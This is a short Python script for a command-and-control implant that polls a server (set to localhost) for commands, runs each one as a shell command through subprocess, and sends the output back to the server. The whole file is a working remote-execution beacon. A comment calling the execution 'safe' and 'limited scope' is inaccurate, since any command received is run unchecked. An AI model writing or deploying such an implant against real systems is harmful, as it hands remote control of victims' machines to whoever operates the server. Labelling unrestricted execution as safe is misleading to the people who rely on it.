import requests
import time
import subprocess

AGENT_ID = "A01"
COMMAND_API = "http://localhost:5000/api/get-command"
RESULT_API = "http://localhost:5000/api/command-result"

print(f"🔄 Agent {AGENT_ID} starting... polling for commands")

while True:
    try:
        # Poll C2 for any pending command
        res = requests.post(COMMAND_API, json={"agent_id": AGENT_ID})
        data = res.json()

        if data.get("status") == "command":
            command = data["command"]
            print(f"🟢 Received command: {command}")

            # Safe execution (local, limited scope)
            result = subprocess.getoutput(command).strip()  # 🔧 Strip trailing newlines

            if not result:
                result = "[No output]"  # 🔧 fallback for empty results

            # Send back result to C2
            requests.post(
                RESULT_API,
                json={
                    "agent_id": AGENT_ID,
                    "result": result
                }
            )

        time.sleep(3)

    except Exception as e:
        print("❌ Error polling:", e)
        time.sleep(5)
